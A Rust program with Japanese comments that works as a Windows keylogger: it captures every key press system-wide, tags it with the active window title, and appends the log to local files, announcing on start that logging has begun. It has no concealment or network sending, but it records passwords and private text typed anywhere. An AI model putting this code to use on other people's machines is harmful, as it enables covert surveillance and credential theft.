// rdevクレートやその他標準ライブラリから必要なアイテムをインポートします.
use rdev::{listen, Event, EventType};
use std::sync::Mutex;
use std::time::{Duration, Instant};
use std::thread;
use std::fs;
use std::fs::OpenOptions;
use std::io::Write;
use lazy_static::lazy_static;
use std::path::Path;

use windows::Win32::UI::WindowsAndMessaging::{GetForegroundWindow, GetWindowTextW, GetWindowTextLengthW};
use windows::Win32::Foundation::HWND;
use std::ffi::OsString;
use std::os::windows::ffi::OsStringExt;


// 前回のキー押下時刻を保持するためのグローバルな可変変数を定義します.
lazy_static! {
    static ref LAST_KEY_EVENT: Mutex<Option<Instant>> = Mutex::new(None);
}

// キー入力をバッファするためのグローバルな文字列変数を定義します.
lazy_static! {
    static ref KEY_BUFFER: Mutex<String> = Mutex::new(String::new());
}

// 閾値のミリ秒数を定義します.
// 必要に応じてこの値（nミリ秒）を変更してください.
const THRESHOLD_MILLI_SECS: u64 = 500;

// ファイル書き込み間隔を定義します.
const WRITE_INTERVAL_SECS: u64 = 1;

/// キーイベントを処理するためのコールバック関数です.
fn callback(event: Event) {
    // イベントがキー押下イベントかどうかチェックします.
    if let EventType::KeyPress(key) = event.event_type {
        let now = Instant::now();
        let mut last_event = LAST_KEY_EVENT.lock().unwrap();
        let mut buffer = KEY_BUFFER.lock().unwrap();
        if let Some(previous) = *last_event {
            let elapsed = now.duration_since(previous);
            if elapsed >= Duration::from_millis(THRESHOLD_MILLI_SECS) {
                // 前回のキー入力から時間が空いている場合、改行を追加します
                buffer.push_str("\n");
            }
            else {
                // 前回のキー入力の直後の場合、空白を追加します
                buffer.push_str(" ");
            }
        }
        // 前回のキー押下時刻を更新します.
        *last_event = Some(now);

        // 記録するキーの名前を決定します.
        let key_name = if let Some(name) = event.name {
            if format!("{:?}", &name).len() == 3 {
                match name.as_str() {
                    " " => "<Space>".to_string(),
                    _ => name,
                }
            } else { format!("<{:?}>", key) }
        } else {
            match format!("<{:?}>", key).as_str() {
                "<Unknown(244)>" => "<F>".to_string(),
                "<Unknown(243)>" => "<H>".to_string(),
                "<Unknown(93)>" => "<App>".to_string(),
                _ => format!("<{:?}>", key),
            }
        };
        // println!("{:?}", key_name);
        // キー名をグローバルバッファにスペース区切りで追加します.
        buffer.push_str(&key_name);
    }
}

fn get_active_window_title() -> Option<String> {
    unsafe {
        // Get the handle of the foreground (active) window.
        let hwnd: HWND = GetForegroundWindow();
        if hwnd.0 == std::ptr::null_mut() {
            return None;
        }
        // Get the length of the window title in UTF-16 characters.
        let length = GetWindowTextLengthW(hwnd) as usize;
        if length == 0 {
            return None;
        }
        // Create a buffer to hold the title plus a null terminator.
        let mut buffer: Vec<u16> = vec![0; length + 1];
        // Copy the window title into the buffer.
        let copied = GetWindowTextW(hwnd, &mut buffer);
        if copied == 0 {
            return None;
        }
        // Convert the UTF-16 buffer into a Rust OsString, then into a String.
        let os_string = OsString::from_wide(&buffer[..copied as usize]);
        os_string.into_string().ok()
    }
}

fn extract_after_last_hyphen(s: &str) -> String {
    // 入力文字列内で '-' または '—' の最後の出現箇所を char_indices を使って取得します。
    if let Some((index, ch)) = s.char_indices().rfind(|&(_, c)| c == '-' || c == '—') {
        // マッチした文字のUTF-8の長さを加えて、次の有効な文字境界を計算します。
        let next_index = index + ch.len_utf8();
        // 見つかったダッシュの後ろの部分を抽出し、余分な空白を削除します。
        let extracted = s[next_index..].trim();
        // 文字をフィルターし、アルファベット、'_'、および ' ' のみを保持します。
        return extracted
            .chars()
            .filter(|c| c.is_ascii_alphabetic() || *c == '_' || *c == ' ')
            .collect();
    }
    // ダッシュが見つからなかった場合は、文字列全体に対してフィルターを適用します。
    s.chars()
        .filter(|c| c.is_ascii_alphabetic() || *c == '_' || *c == ' ')
        .collect()
}

// Function to filter out disallowed characters for Windows file names
// This function takes a reference to a string slice and returns a new String
fn filter_windows_filename(input: &str) -> String {
    // List of characters that are not allowed in Windows file names
    let invalid_chars = ['<', '>', ':', '"', '/', '\\', '|', '?', '*'];

    // Iterate through each character in the input string,
    // and collect only those characters that are not in the invalid_chars list.
    input.chars()
        .filter(|c| !invalid_chars.contains(c))
        .collect()
}

fn main() {
    let path = "./log";
    // キーロガーが開始されたことをユーザーに通知します.
    println!("キーロガーを開始します。内容は {} に保存されます。",path);

    // バッファの内容をテキストファイルに追記するスレッドを生成します.
    thread::spawn(move || {
        loop {
            // 書き込み時間まで待機します.
            thread::sleep(Duration::from_secs(WRITE_INTERVAL_SECS));
            let mut buffer = KEY_BUFFER.lock().unwrap();
            let win_title = filter_windows_filename(&get_active_window_title().unwrap_or("unknown".to_string()));
            let title = extract_after_last_hyphen(&win_title);
            // println!("{} :: {}",title,get_active_window_title().unwrap_or("unknown".to_string()));
            if !buffer.is_empty() {
                if !Path::new(&format!("{}/{}",path,title)).exists() {
                    // フォルダが存在しないので作成する
                    let _ = fs::create_dir_all(format!("{}/{}",path,title));
                    println!("フォルダを作成しました: {}", format!("{}/{}",path,title));
                } else { }
                // テキストファイルに追記します.
                let mut file = OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(format!("{}/{}/{}.txt",path,title,win_title))
                    .expect("ファイルを開けませんでした");
                if let Err(e) = write!(file, "{}", *buffer) {
                    eprintln!("ファイルへの書き込みに失敗しました: {:?}", e);
                }
                // バッファをクリアします.
                buffer.clear();
            }
        }
    });

    // グローバルなキーボードイベントの監視を開始します.
    if let Err(error) = listen(callback) {
        // エラーが発生した場合はエラーメッセージを表示します.
        eprintln!("Error: {:?}", error);
    }
}
